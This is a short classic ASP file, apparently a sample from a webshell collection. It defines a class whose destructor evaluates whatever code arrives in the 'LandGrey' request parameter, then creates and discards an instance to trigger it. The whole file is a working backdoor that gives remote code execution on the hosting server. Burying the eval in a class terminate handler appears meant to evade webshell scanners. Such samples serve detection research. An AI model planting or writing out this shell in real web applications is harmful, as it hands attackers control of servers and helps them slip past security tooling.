<%
Class LandGrey
  Private Sub class_terminate
    eval	(request("LandGrey"))
  End Sub
End Class

Set X = New LandGrey
Set X = Nothing
%>